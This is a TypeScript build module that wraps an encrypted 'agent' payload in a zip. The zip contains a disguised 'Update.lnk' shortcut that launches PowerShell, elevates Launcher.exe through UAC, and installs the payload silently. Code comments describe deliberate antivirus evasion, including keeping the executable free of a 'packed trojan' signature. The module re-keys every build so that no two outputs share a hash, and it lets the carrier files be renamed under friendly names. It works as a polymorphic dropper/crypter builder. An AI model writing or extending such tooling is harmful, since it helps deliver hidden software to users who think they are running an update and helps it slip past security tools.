/**
 * launcher-build.ts — WP4 launcher-mode build path (PORTABLE Update.lnk).
 *
 * Mirrors generator/launcher/dev/make-stamp.mjs byte-for-byte: takes one warm
 * launcher from the pool, seals a fresh per-build envelope
 * (K_B ‖ IV_PAY ‖ IV_CFG ‖ CK) with the launcher's compile-time seal, re-keys
 * the cached payload and builds the URL-query config under K_B, appends
 * [hdr][env][cfg][pay][trailer] to the pooled exe, writes the sibling agent.bin,
 * and zips the PORTABLE carrier { Update.lnk, launcher/Launcher.exe,
 * launcher/agent.bin } into the job dir, then runs the WP6 validation report
 * card (server-side checks). Nothing is downloaded at build time; the payload
 * plaintext lives only in memory.
 *
 * PORTABILITY (FIX 1, final): the user double-clicks **Update.lnk**, which is a
 * PowerShell-bridge shortcut that targets the OS PowerShell at a FIXED system
 * path (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` — NO baked
 * username/path) and runs `Start-Process -FilePath ".\launcher\Launcher.exe"
 * -Verb RunAs`. Explorer starts the target in the Update.lnk's OWN folder (cwd),
 * so the relative `.\(sub)\\Launcher.exe` always resolves from wherever the
 * user extracted — dynamic, no hardcoded path. UAC comes from `-Verb RunAs`
 * (and/or the launcher's requireAdministrator). The launcher reads its sibling
 * agent.bin from ITS folder and installs silently.
 */

import * as crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import { spawn } from "child_process";
import * as storage from "./storage";
import * as payloadCache from "./payload-cache";
import * as launcherPool from "./launcher-pool";
import { createZip } from "./zip-archive";
import { validateLauncherBuild } from "./launcher-validate";
import { HDR_LEN, ENV_LEN, assembleOverlay, buildAgentBin } from "./launcher-overlay";

export { HDR_LEN, ENV_LEN };

export interface LauncherBuildInputs {
  apiUrl: string;
  clientId: number;
  siteId: number;
  agentType: "workstation" | "server";
  authToken: string;
  features: string[];
  /** Enrollment command carried INSIDE the encrypted config (runbook reference). */
  enroll: string;
  /** Windows staging directory for the decoded payload. */
  outDir: string;
  /** Emit LAUNCHER-STAGE-OK after staging (observability; silent when false). */
  debug: boolean;
}

export interface LauncherRunOutput {
  zip: Buffer;
  stampedExe: Buffer;
  lnk: Buffer;
  tag: string;
  launcherSha256: string;
  lnkSha256: string;
  overlay: Buffer;
  configText: string;
}

/** Optional renameable artifact names (FIX 3). Defaults preserve the working flow. */
export interface LauncherNames {
  updateLinkName?: string; // the .lnk entry name (default "Update.lnk")
  innerFolder?: string; // the subfolder holding launcher+payload (default "launcher")
  zipName?: string; // the served zip download filename (default "Agent.zip")
  launcherName?: string; // the launcher exe entry name (default "Launcher.exe")
  payloadName?: string; // the encrypted payload entry name (default "agent.bin")
}

const LNK_TIMEOUT_MS = 120000; // pwsh New-AgentShortcut.ps1 (bridge .lnk build)

// Per-build diversity tracking: a build whose stamped launcher or Update.lnk
// byte-matches the previous build's (astronomically unlikely) is rejected.
let lastLauncherSha256: string | null = null;
let lastLnkSha256: string | null = null;

function sha256Hex(data: Buffer): string {
  return crypto.createHash("sha256").update(data).digest("hex");
}

/** URL-query config wire format (values percent-encoded, mirrored in CfgGet). */
export function buildConfigString(c: LauncherBuildInputs, payloadName?: string): string {
  const enc = (s: string) => encodeURIComponent(s);
  const parts = [
    `apiUrl=${enc(c.apiUrl)}`,
    `clientId=${enc(String(c.clientId))}`,
    `siteId=${enc(String(c.siteId))}`,
    `agentType=${enc(c.agentType)}`,
    `authToken=${enc(c.authToken)}`,
    `features=${enc(c.features.join(","))}`,
    `enroll=${enc(c.enroll)}`,
    `outDir=${enc(c.outDir)}`,
    `debug=${c.debug ? "1" : "0"}`,
  ];
  // The runtime payload sibling-file name (FIX 3 rename): the native launcher
  // reads this from the decrypted config so the zip entry may be renamed
  // freely (falls back to "agent.bin" when absent — legacy stamps stay valid).
  if (payloadName) parts.push(`payName=${enc(payloadName)}`);
  return parts.join("&");
}

interface PwshResult {
  ok: boolean;
  output: string;
}

function runPwsh(args: string[]): Promise<PwshResult> {
  return new Promise((resolve) => {
    try {
      let stdout = "";
      let stderr = "";
      const proc = spawn("pwsh", ["-NoProfile", "-NoLogo", "-File", ...args], {
        timeout: LNK_TIMEOUT_MS,
      });
      proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
      proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
      proc.on("error", (err: Error) =>
        resolve({ ok: false, output: err.message })
      );
      proc.on("close", (code: number | null) => {
        if (code === 0) resolve({ ok: true, output: stdout });
        else if (code === null)
          resolve({
            ok: false,
            output: `Update.lnk bridge build timed out after ${LNK_TIMEOUT_MS / 1000}s`,
          });
        else {
          const tail =
            stderr.length > 500 ? stderr.slice(-500) : stderr || stdout;
          resolve({ ok: false, output: tail });
        }
      });
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      resolve({ ok: false, output: message });
    }
  });
}

/**
 * Run the launcher-mode build end-to-end for a job. The zip is written to
 * storage.zipOutputPath(jobId) and validated; on any failure it throws (the
 * caller cleans up the job dir).
 */
export async function runLauncherBuild(opts: {
  jobId: string;
  inputs: LauncherBuildInputs;
  names?: LauncherNames;
}): Promise<LauncherRunOutput> {
  const { jobId, inputs } = opts;

  // FIX 3: resolve optional renameable names (defaults = confirmed working flow;
  // defaults produced byte-identical output when no names are supplied).
  const clean = (v: string | undefined, d: string): string => {
    const s = (v ?? "").trim();
    if (!s) return d;
    if (/[/\\"\u0000-\u001f]/.test(s) || s.includes("..") || s.length > 64) return d;
    return s;
  };
  // A Windows shortcut MUST carry the .lnk extension or Explorer won't treat it
  // as a launchable shortcut on double-click. The user only types a friendly
  // name, so auto-append ".lnk" when omitted (default "Update.lnk" already has
  // it; stays ≤64 chars — any overflow falls back to the default).
  let updateLinkName = clean(opts.names?.updateLinkName, "Update.lnk");
  if (!/\.lnk$/i.test(updateLinkName)) {
    const withExt = updateLinkName + ".lnk";
    updateLinkName = withExt.length <= 64 ? withExt : "Update.lnk";
  }
  const innerFolder = clean(opts.names?.innerFolder, "launcher");
  const launcherName = clean(opts.names?.launcherName, "Launcher.exe");
  const payloadName = clean(opts.names?.payloadName, "agent.bin");
  // FIX 3: custom served zip download name (optional; fallback "Agent.zip").
  // Sanitized with the same bare-name rule, then persisted per job so
  // getZipDownload can set Content-Disposition at download time.
  const zipName = clean(opts.names?.zipName, "Agent.zip");
  storage.saveZipName(jobId, zipName);

  // 1. warm launcher (compile-on-demand only when the pool is empty).
  const entry = await launcherPool.take();

  // 2. payload plaintext in memory ONLY (decrypts the cached blob, never
  //    persisted), then re-key under a fresh per-build K_B/IV_PAY.
  const plain = payloadCache.getPayloadBytes();
  const kb = crypto.randomBytes(32);
  const ivPay = crypto.randomBytes(16);
  const ivCfg = crypto.randomBytes(16);
  const payCipher = payloadCache.reKey(plain, kb, ivPay);

  // 3. config string + cipher (K_B/IV_CFG).
  const configText = buildConfigString(inputs, payloadName);

  // 4. assemble the (EXTERNAL-payload) overlay + write the sibling agent.bin.
  //    Option A (AV): the payload ciphertext is NOT appended to Launcher.exe,
  //    so the PE stays a small low-entropy binary (no "tiny exe + 12 MB random
  //    blob = packed trojan" ML signature). Launcher reads agent.bin at runtime.
  const sealKey = Buffer.from(entry.sealKeyHex, "hex");
  const sealIv = Buffer.from(entry.sealIvHex, "hex");
  const overlay = assembleOverlay({
    sealKey,
    sealIv,
    kb,
    ivPay,
    ivCfg,
    configText,
    payload: plain,
    payloadCipher: payCipher,
    flags: 0,
    externalPayload: true,
  });
  const agentBin = buildAgentBin({
    sealKey,
    sealIv,
    kb,
    ivPay,
    ivCfg,
    configText,
    payload: plain,
    payloadCipher: payCipher,
    flags: 0,
    externalPayload: true,
  });
  const stampedExe = Buffer.concat([entry.exe, overlay]);
  if (!launcherPool.peIsGui(stampedExe)) {
    throw new Error(
      "stamped launcher is not a GUI-subsystem PE — build aborted"
    );
  }

  const launcherPath = storage.launcherOutputPath(jobId);
  const agentBinPath = storage.agentBinOutputPath(jobId);
  const lnkPath = storage.lnkRelativeOutputPath(jobId);
  fs.writeFileSync(launcherPath, stampedExe);
  fs.writeFileSync(agentBinPath, agentBin);

  // 5. Portable PowerShell-bridge Update.lnk: fixed system powershell target,
  //    runs Start-Process .\launcher\Launcher.exe -Verb RunAs from the .lnk's
  //    own folder (cwd) -> UAC -> launcher reads agent.bin -> silent install.
  const bridgeResult = await runPwsh([
    path.join(__dirname, "New-AgentShortcut.ps1"),
    "-PowershellBridge",
    "-Output",
    lnkPath,
    "-LauncherSubFolder",
    innerFolder,
    "-LauncherTarget",
    launcherName,
    "-LauncherTag",
    entry.tag,
  ]);
  if (!bridgeResult.ok) {
    throw new Error(`Powershell-bridge Update.lnk build failed: ${bridgeResult.output}`);
  }
  if (!fs.existsSync(lnkPath)) {
    throw new Error("Update.lnk was not produced");
  }
  const lnk = fs.readFileSync(lnkPath);

  // 6. zip { <updateLinkName>, <innerFolder>/Launcher.exe, <innerFolder>/agent.bin }
  //    (temp files stay until validation). The launcher/* subfolder = FIX 2
  //    structure; the names are FIX 3 (defaults preserved when unset).
  const zip = createZip([
    { name: updateLinkName, data: lnk },
    { name: `${innerFolder}/${launcherName}`, data: stampedExe },
    { name: `${innerFolder}/${payloadName}`, data: agentBin },
  ]);
  const zipPath = storage.zipOutputPath(jobId);
  fs.writeFileSync(zipPath, zip);

  // 7. WP6 validation report card (server-side checks).
  const lzHash = sha256Hex(stampedExe);
  const lnkHash = sha256Hex(lnk);
  const validation = await validateLauncherBuild({
    lnkPath,
    launcherPath,
    zipPath,
    authToken: inputs.authToken,
    payloadPlain: plain,
    sealKey,
    sealIv,
    agentBin,
    prevLauncherHash: lastLauncherSha256,
    prevLnkHash: lastLnkSha256,
    names: { updateLinkName, innerFolder, launcherName, payloadName },
  });
  for (const row of validation.rows) console.log(`  [validate] ${row}`);
  if (!validation.ok) {
    throw new Error("Launcher build failed validation — job aborted");
  }
  // Task D: the zip is kept until expiry; drop the temp Update.lnk + launcher files.
  storage.removeLauncherTemp(jobId);
  lastLauncherSha256 = lzHash;
  lastLnkSha256 = lnkHash;

  console.log(
    `Launcher build ok for job ${jobId}; launcher=${stampedExe.length}B ` +
      `overlay=${overlay.length}B cfg=${configText.length}B zip=${zip.length}B ` +
      `tag=${entry.tag.slice(0, 8)}`
  );

  return {
    zip,
    stampedExe,
    lnk,
    tag: entry.tag,
    launcherSha256: lzHash,
    lnkSha256: lnkHash,
    overlay,
    configText,
  };
}
